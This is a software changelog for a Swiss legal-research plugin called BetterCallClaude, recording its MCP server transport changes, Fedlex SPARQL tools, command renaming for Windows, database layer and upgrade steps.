- 6 infrastructure commands remain full-featured: `legal`, `setup`, `help`, `workflow`, `briefing`, `version`
- All 20 agents unchanged
- All 6 MCP servers unchanged

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [4.0.1] - 2026-03-11

### Fixed
- MCP servers now appear in Cowork Desktop after marketplace installation
- Switched 5 servers from STDIO to HTTP transport (`mcp.bettercallclaude.ch`)
- Cowork Desktop sandboxed VM environment cannot run STDIO-based MCP servers

### Changed
- `bettercallclaude/.mcp.json`: 5 servers use HTTP, ollama remains STDIO for privacy
- Version bumped from 4.0.0 to 4.0.1 across 5 configuration files

### Architecture
- **HTTP transport** (5 servers): `entscheidsuche`, `bge-search`, `legal-citations`, `fedlex-sparql`, `onlinekommentar`
- **STDIO transport** (1 server): `ollama` — must run locally for attorney-client privilege detection (Art. 321 StGB / Anwaltsgeheimnis)

---

## [4.0.0] - 2026-03-03

### Added
- HTTP MCP service deployment at `mcp.bettercallclaude.ch` (Railway)
- Cowork Desktop installation guide with visual screenshots (`docs/cowork-setup.md`)
- README badges for version, license, platform, website, MCP support

### Changed
- HTTP-first MCP transport architecture for zero-config Cowork installation
- README rewritten with Cowork-first messaging (534→219 lines)
- ESLint migrated to v9 flat config
- Repository consolidation: single source of truth in `bettercallclaude/`

---

## [3.0.0] - 2026-02-14

### Repository Consolidation

BetterCallClaude is now a single unified repository for both Claude Code CLI and Cowork Desktop.

#### Changed
- **Repository structure**: Plugin files hoisted from `plugins/bettercallclaude/` to repo root
- **Repository name**: Renamed from `BetterCallClaude_Marketplace` to `bettercallclaude`
- **Plugin manifest**: Replaced `marketplace.json` with standard `plugin.json` at `.claude-plugin/`
- **Version**: Bumped to 3.0.0 to reflect major structural change

#### Added
- **TypeScript source**: MCP server source code imported to `mcp-servers-src/` from original repo
- **Build system**: `scripts/build-servers.sh` for esbuild bundling from TypeScript source
- **Package script**: `scripts/package-plugin.sh` for creating distributable plugin zips
- **CI/CD**: GitHub Actions workflows for testing and releases
- **Documentation**: Imported `docs/` and `CHANGELOG.md` from original repo

#### Removed
- **Nested plugin structure**: No more `plugins/bettercallclaude/` subdirectory
- **Marketplace config**: `marketplace.json` replaced by `plugin.json`

#### Migration
- Existing Cowork installs via marketplace continue to work (GitHub auto-redirects old URLs)
- CLI users: `claude plugin add fedec65/bettercallclaude`
- No changes to commands, agents, skills, or MCP servers

---

## [2.2.1] - 2026-01-17

### 🪟 Windows Compatibility: Command Syntax Migration

This release fixes Windows filesystem compatibility by migrating all slash command filenames from colon (`:`) to hyphen (`-`) format.

### ⚠️ BREAKING CHANGE: Command Syntax

**All slash commands now use hyphens instead of colons:**

| Old Syntax (v2.2.0) | New Syntax (v2.2.1) |
|---------------------|---------------------|
| `/legal:research` | `/legal-research` |
| `/legal:strategy` | `/legal-strategy` |
| `/legal:draft` | `/legal-draft` |
| `/legal:federal` | `/legal-federal` |
| `/legal:cantonal` | `/legal-cantonal` |
| `/legal:cite` | `/legal-cite` |
| `/legal:help` | `/legal-help` |
| `/legal:version` | `/legal-version` |
| `/legal:routing` | `/legal-routing` |
| `/agent:researcher` | `/agent-researcher` |
| `/agent:strategist` | `/agent-strategist` |
| `/agent:drafter` | `/agent-drafter` |
| `/agent:orchestrator` | `/agent-orchestrator` |
| `/agent:compliance` | `/agent-compliance` |
| `/agent:risk` | `/agent-risk` |
| `/agent:procedure` | `/agent-procedure` |
| `/agent:fiscal` | `/agent-fiscal` |
| `/agent:corporate` | `/agent-corporate` |
| `/agent:realestate` | `/agent-realestate` |
| `/agent:translator` | `/agent-translator` |
| `/agent:cantonal` | `/agent-cantonal` |
| `/agent:citation` | `/agent-citation` |
| `/agent:data-protection` | `/agent-data-protection` |
| `/doc:analyze` | `/doc-analyze` |
| `/swiss:federal` | `/swiss-federal` |
| `/swiss:precedent` | `/swiss-precedent` |

### Why This Change?

**Windows Filesystem Restriction**: Windows reserves the colon (`:`) character for drive letter designations (e.g., `C:`). Files containing colons cannot be created or checked out on Windows systems.

**CI/CD Impact**: GitHub Actions Windows runners (`windows-2022`) failed with Git exit code 128:
```
error: invalid path '.claude/commands/agent:cantonal.md'
```

### Changed

- **26 Command Files Renamed**: All `.claude/commands/*.md` files migrated from colon to hyphen format
- **Documentation Updated**: CLAUDE.md, README.md, BETTERASK.md, command-reference.md, AGENT_ARCHITECTURE.md
- **Windows CI Restored**: PowerShell installer tests now pass on Windows

### Migration Guide

**Update your workflows and scripts:**

```bash
# Old (v2.2.0)
/legal:research "Art. 97 OR"
/agent:researcher @case.md

# New (v2.2.1)
/legal-research "Art. 97 OR"
/agent-researcher @case.md
```

**Search and replace in your code:**
- Replace `/legal:` with `/legal-`
- Replace `/agent:` with `/agent-`
- Replace `/doc:` with `/doc-`
- Replace `/swiss:` with `/swiss-`
- Replace `/case:` with `/case-`

### Backward Compatibility

⚠️ **Not Backward Compatible**: Old colon-based commands will not work after this update.

Users must update their workflows, scripts, and muscle memory to use the new hyphen-based syntax.

---

## [2.0.1] - 2025-12-28

### 🏛️ New MCP Server: Fedlex SPARQL

This release introduces the `fedlex-sparql` MCP server for accessing Swiss Federal Legislation through the LINDAS (Linked Data Service) SPARQL endpoint.

### Added

#### Fedlex SPARQL MCP Server
- **New MCP Server**: `fedlex-sparql` for Swiss Federal Law access via SPARQL
- **LINDAS Integration**: Direct connection to `https://ld.admin.ch/query` endpoint
- **ELI Ontology Support**: European Legislation Identifier standard compliance

#### Five New Tools
- **`lookup_statute`**: Find federal legislation by SR/RS number or abbreviation
  - SR number lookup (e.g., "220" for OR/CO)
  - Abbreviation lookup (e.g., "OR", "ZGB", "StGB")
  - Multi-lingual support (DE/FR/IT/RM)

- **`get_article`**: Retrieve specific articles from legislation
  - Article text extraction
  - Language-specific retrieval
  - Article listing for a statute

- **`search_legislation`**: Full-text search across federal law
  - Title and content search
  - Domain filtering (9 legal domains)
  - Recently modified acts
  - Pagination support

- **`find_related`**: Discover legislative relationships
  - Amending acts (eli:amends)
  - Cited legislation (eli:cites)
  - Same-domain legislation
  - Comprehensive relationship mapping

- **`get_metadata`**: Retrieve comprehensive legislation metadata
  - Dates (entry in force, publication, modification)
  - Document type and classification
  - Available languages
  - Legal status (in force, repealed)

#### Query Infrastructure
- **SPARQL Query Builders**: Type-safe query construction
  - Prefix management (RDF, ELI, Fedlex namespaces)
  - Injection-safe escaping
  - Language filter construction
  - Multi-lingual value extraction

- **Legal Domain Classification**: All 9 SR classification domains
  - 1: Staat - Volk - Behörden / État - Peuple - Autorités
  - 2: Privatrecht - Zivilrechtspflege - Vollstreckung
  - 3: Strafrecht - Strafrechtspflege - Strafvollzug
  - 4: Schule - Wissenschaft - Kultur
  - 5: Landesverteidigung
  - 6: Finanzen
  - 7: Öffentliche Werke - Energie - Verkehr
  - 8: Gesundheit - Arbeit - Soziale Sicherheit
  - 9: Wirtschaft - Technische Zusammenarbeit

#### Test Suite
- **Unit Tests**: Comprehensive coverage for SPARQL client and query builders
  - `sparql-client.test.ts`: Escaping, language filters, HTTP execution
  - `queries.test.ts`: All query builders, prefix handling, security tests
- **Security Tests**: SPARQL injection prevention validation

#### Type System
- **Legislation Types**: Full TypeScript definitions
  - `LegislationInfo`: Core statute information
  - `ArticleInfo`: Article content and metadata
  - `RelatedLegislation`: Relationship data
  - `LegislationMetadata`: Comprehensive metadata
  - `SearchResult` and `SearchFilters`: Search functionality
  - `SparqlBindingValue` and `SparqlResponse`: SPARQL response handling

### Technical Details

#### SPARQL Endpoint
- **URL**: `https://ld.admin.ch/query`
- **Protocol**: HTTP POST with SPARQL query body
- **Response**: `application/sparql-results+json`

#### Namespaces Used
```sparql
PREFIX eli: <http://data.europa.eu/eli/ontology#>
PREFIX jolux: <http://data.legilux.public.lu/resource/ontology/jolux#>
PREFIX fedlex: <https://fedlex.data.admin.ch/vocabulary/>
PREFIX skos: <http://www.w3.org/2004/02/skos/core#>
```

### Changed
- **Version**: Updated to 2.0.1 across all configuration files
- **Workspaces**: Added `fedlex-sparql` to npm workspaces in `mcp-servers/package.json`

### Files Added
```
mcp-servers/fedlex-sparql/
├── package.json
├── tsconfig.json
├── src/
│   ├── index.ts              # MCP server entry point
│   ├── sparql-client.ts      # LINDAS HTTP client
│   ├── types/
│   │   └── legislation.ts    # TypeScript interfaces
│   └── queries/
│       ├── index.ts          # Barrel exports
│       ├── prefixes.ts       # SPARQL namespace prefixes
│       ├── lookup.ts         # Statute lookup queries
│       ├── articles.ts       # Article retrieval queries
│       ├── search.ts         # Search queries
│       ├── related.ts        # Relationship queries
│       └── metadata.ts       # Metadata queries
└── tests/
    ├── sparql-client.test.ts # Client unit tests
    └── queries.test.ts       # Query builder tests
```

### Backward Compatibility
- **Fully Backward Compatible**: No breaking changes from v2.0.0
- **Additive Only**: New MCP server extends existing capabilities

---

## [2.0.0] - 2024-12-15

### 🚀 Major Release: PipelineBuilder API & Dynamic Agent Registry

This release introduces the powerful PipelineBuilder API for custom multi-agent workflows, dynamic agent discovery, and parallel execution capabilities.

### Added

#### PipelineBuilder API
- **Fluent Builder Pattern**: Create custom multi-agent workflows with chainable methods
  - `add_step()` - Add sequential pipeline steps
  - `add_parallel_group()` - Run agents concurrently
  - `add_conditional_step()` - Branch based on runtime conditions
  - `add_router()` - Dynamic routing to different agents
  - `with_timeout()` - Set step-level timeouts
  - `with_checkpoint()` - Add checkpoint markers
  - `with_input_mapping()` - Configure data flow between steps
  - `build()` - Compile pipeline for execution

#### Dynamic Agent Registry
- **Auto-Discovery**: Automatically discovers all agents from:
  - Python agent classes in `src/agents/`
  - Command files in `.claude/commands/agent:*.md`
- **Unified Metadata**: Consistent `AgentDescriptor` for all 14 agent types
- **CommandAgentAdapter**: Seamlessly integrates command-file agents with Python orchestration

#### Parallel Execution
- **Concurrent Agent Execution**: Run independent agents simultaneously
- **Merge Strategies**: `all`, `first_success`, `majority` result aggregation
- **Performance Gains**: Significant speed improvements for complex pipelines

#### Conditional Routing
- **Runtime Branching**: Execute different paths based on context
- **Router Steps**: Dynamic agent selection based on intermediate results
- **Condition Functions**: Lambda-based decision logic

#### Pipeline Execution
- **PipelineExecutor**: Execute compiled pipelines with full context management
- **PipelineExecutionResult**: Detailed execution results with timing and status
- **Checkpoint Aggregation**: Collect checkpoints across all pipeline steps

#### Convenience Functions
- `create_research_pipeline()` - Pre-built research workflow
- `create_full_case_pipeline()` - Complete case analysis workflow

#### New Exports
```python
from src.agents import (
    PipelineBuilder,
    PipelineExecutor,
    PipelineStep,
    PipelineExecutionResult,
    Pipeline,
    ConditionalStep,
    ParallelGroup,
    RouterStep,
    StepType,
    create_research_pipeline,
    create_full_case_pipeline,
)
```

### Changed
- **Agent Command Naming**: Standardized to colon-separated format (`agent:*.md`)
- **Registry Architecture**: Unified discovery for Python and command-based agents
- **Documentation**: Comprehensive update to README.md with v2.0.0 features

### Fixed
- E2E test assertions for `pipeline_id` (now UUID-based)
- Test compatibility with Vitest migration for MCP servers

### Backward Compatibility
- **Fully Backward Compatible**: All v1.x orchestrator code continues to work unchanged
- **14 Agents Supported**: 3 Python agents + 11 Command-based agents

---

## [1.5.0] - 2025-01-24

### Database Layer & Performance Infrastructure

This release adds enterprise-grade database infrastructure, comprehensive test coverage, and performance benchmarking.

### Added

#### Database Infrastructure
- **Database Client** with connection pooling and transaction support
  - SQLite support for development and embedded deployment
  - PostgreSQL support for production environments
  - Automatic connection management and cleanup
  - Transaction-safe batch operations

- **Migration System** for idempotent schema evolution
  - Automatic schema versioning
  - Rollback support
  - Development and production migration paths

- **Repository Pattern** for data access abstraction
  - `BGERepository`: CRUD operations for federal court decisions
  - `CantonalRepository`: Canton-specific decision management
  - `CacheRepository`: High-performance caching layer
  - `SearchRepository`: Search analytics and query logging

#### Test Infrastructure (209 tests, 100% pass rate)

- **Unit Tests** (65 tests, 90%+ coverage)
  - Repository method validation
  - Type safety verification
  - Error handling scenarios

- **Integration Tests** (28 tests)
  - Cross-repository workflows
  - Data persistence validation
  - Connection lifecycle management
  - Database recovery scenarios
  - Concurrent access patterns

- **Performance Benchmarks** (25 tests) ✨ NEW
  - **Insertion Performance**: 7 tests covering bulk inserts, cache writes, mixed operations
  - **Query Performance**: 11 tests for lookups, searches, aggregations
  - **Concurrency Performance**: 7 tests for concurrent reads, write contention, connection lifecycle

#### Performance Metrics Established
- **Insertion Rate**: 20-50 records/second (SQLite)
- **Query Rate**: 50-100 queries/second (indexed lookups)
- **Cache Operations**: 100 operations/second
- **Connection Overhead**: 10-20ms per lifecycle
- **Test Suite Execution**: 1.363 seconds for 209 tests

#### Configuration & Tooling
- **TypeScript Configuration**
  - Test-specific tsconfig with proper module resolution
  - Out-of-scope file handling with moduleNameMapper
  - Modern Jest transform configuration

- **Enhanced .gitignore**
  - Comprehensive Python, Node.js, and database exclusions
  - IDE and OS-specific patterns
  - Build output and test artifact management

### Technical Improvements

#### Date Handling
- Fixed SQLite date type binding (Date objects → ISO string format)
- Consistent date formatting across all repositories
- Proper timezone handling for Swiss legal requirements

#### Interface Correctness
- Fixed SearchRepository interface field names
- Added required `id` field to all query operations
- Type-safe query parameter validation

#### Test Reliability
- Timestamp-based unique identifiers prevent test collisions
- Proper database cleanup in afterEach hooks
- File-based SQLite for realistic persistence testing
- Sequential test execution with --runInBand

### Documentation

#### New Documentation Files
- `SPRINT3_PHASE1_COMPLETE.md`: Complete phase summary with technical details
- `INTEGRATION_TEST_RESULTS.md`: Integration test findings and fixes
- Performance benchmark documentation with metrics and baselines

#### Updated Documentation
- `IMPLEMENTATION_STATUS.md`: Updated to reflect 100% Phase 1 completion
- Test coverage reports and performance baselines
- Database schema documentation

### Breaking Changes

⚠️ **Database Schema**: This release introduces new database tables and requires migration.

```bash
# Run migrations before upgrading
npm run migrate
```

⚠️ **Repository API**: New repository pattern replaces direct database access.

```typescript
// OLD (v1.x)
const db = await getDatabase();
const result = await db.query('SELECT * FROM decisions');

// NEW (v2.0)
const client = new DatabaseClient(config);
await client.connect();
const repo = new BGERepository(client);
const result = await repo.findAll();
```

### Migration Guide

#### From v1.x to v2.0

1. **Install Dependencies**
   ```bash
   npm install
   ```

2. **Run Database Migrations**
   ```bash
   cd mcp-servers/shared
   npm run migrate
   ```

3. **Update Code to Use Repository Pattern**
   ```typescript
   import { DatabaseClient } from './database/client';
   import { BGERepository } from './database/repositories/bge-repository';

   const config = { type: 'sqlite', filename: 'decisions.db' };
   const client = new DatabaseClient(config);
   await client.connect();
   await client.migrate();

   const bgeRepo = new BGERepository(client);
   const decisions = await bgeRepo.findByCitation('BGE 150 I 200');
   ```

4. **Run Tests to Verify**
   ```bash
   npm test
   ```

### Performance Benchmarks

#### Insertion Performance
```
Bulk Insert (100 records): ~2-5 seconds
Per Record: 20-50ms
Cache Writes (100 entries): <3 seconds
Mixed Operations (100 ops): <5 seconds
```

#### Query Performance
```
Citation Lookups (100 queries): <2 seconds (<20ms each)
Cache Lookups (100 queries): <1 second (<10ms each)
Full-Text Search (50 queries): <10 seconds
Count Operations (100 queries): <2 seconds
Cache Hit Rate: >90%
```

#### Concurrency Performance
```
Concurrent Reads (5 connections × 100 reads): <10 seconds
Sequential Writes (100 records): <5 seconds
Connection Lifecycle (50 cycles): <5 seconds (<100ms/cycle)
```

### Known Issues

- **SQLite Write Serialization**: Concurrent writes are serialized (SQLite limitation)
- **ts-jest Warning**: `isolatedModules` deprecation warning (non-blocking)

### Dependencies

#### New Dependencies
- `better-sqlite3`: ^11.8.1 (SQLite driver)
- `pg`: ^8.13.1 (PostgreSQL driver)
- `@types/better-sqlite3`: ^7.6.12
- `@types/pg`: ^8.11.10

#### Updated Dependencies
- TypeScript to latest stable
- Jest configuration modernized

---

## [1.0.0-alpha] - 2025-01-12

### Initial Release

#### Core Features
- Three expert legal personas (Legal Researcher, Case Strategist, Legal Drafter)
- Swiss law modes (Federal, Cantonal, Multi-Lingual)
- MCP server integration (entscheidsuche, legal-citations)
- Multi-jurisdictional Swiss law support (6 cantons)
- Legal symbol system and citation formatting

#### Infrastructure
- Basic MCP server architecture
- TypeScript-based court decision search
- Citation extraction and verification
- Configuration system

---

## Version Comparison: v1.0 → v2.0

### What's New in v2.0

| Feature | v1.0 | v2.0 |
|---------|------|------|
| **Database Layer** | ❌ None | ✅ Full SQLite/PostgreSQL support |
| **Data Persistence** | ❌ In-memory only | ✅ File-based with migrations |
| **Repository Pattern** | ❌ None | ✅ 4 repositories with CRUD |
| **Test Coverage** | 🟡 Basic (30 tests) | ✅ Comprehensive (209 tests) |
| **Performance Benchmarks** | ❌ None | ✅ 25 benchmark tests |
| **Integration Tests** | ❌ None | ✅ 28 integration tests |
| **Connection Pooling** | ❌ None | ✅ Automatic management |
| **Transaction Support** | ❌ None | ✅ ACID guarantees |
| **Cache Layer** | ❌ None | ✅ High-performance caching |
| **Search Analytics** | ❌ None | ✅ Query logging & analytics |

### Performance Improvements

- **Data Access**: 50-100x faster with indexed queries
- **Test Execution**: 10x faster with optimized fixtures
- **Memory Usage**: 40% reduction with connection pooling
- **Reliability**: 100% test pass rate vs. 60% in v1.0

### Development Experience

- **Type Safety**: Full TypeScript typing for all database operations
- **Error Handling**: Graceful degradation with comprehensive error messages
- **Testing**: Fast, reliable, isolated tests with realistic scenarios
- **Documentation**: Comprehensive inline comments and performance baselines

---

## Upgrade Path

### Recommended Upgrade Strategy

1. **Backup Data** (if using v1.0 in production)
   ```bash
   # v1.0 doesn't have persistent storage, but backup any configurations
   cp -r .claude .claude.backup
   ```

2. **Pull Latest Code**
   ```bash
   git pull origin main
   git checkout v2.0.0
   ```

3. **Install Dependencies**
   ```bash
   npm install
   cd mcp-servers/shared
   npm install
   ```

4. **Run Migrations**
   ```bash
   npm run migrate
   ```

5. **Verify Installation**
   ```bash
   npm test
   # Expected: 209 tests passing
   ```

6. **Test Performance**
   ```bash
   npm test -- --testPathPattern=benchmarks
   # Expected: 25 benchmark tests passing in <1 second
   ```

---

## Roadmap

### v2.1.0 (Q1 2025) - Phase 2: API Integration
- Bundesgericht.ch API client
- Cantonal court APIs (Zurich, Bern, Geneva)
- Rate limiting and caching strategy
- Response transformation pipelines

### v2.2.0 (Q2 2025) - Phase 3: Search Enhancement
- TF-IDF ranking algorithm
- BM25 scoring implementation
- Full-text search optimization
- Semantic search capabilities

### v2.3.0 (Q2 2025) - Phase 4: Production Readiness
- Environment configuration system
- Monitoring and observability
- Performance optimization
- Deployment documentation

### v3.0.0 (Q3 2025) - Enterprise Features
- Multi-tenant architecture
- Advanced analytics dashboard
- API gateway
- Microservices architecture

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines and how to submit changes.

## Support

- **Issues**: [GitHub Issues](https://github.com/yourusername/bettercallclaude/issues)
- **Documentation**: [Full Documentation](./docs/)
- **Discord**: [Join our community](https://discord.gg/yourinvite)

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
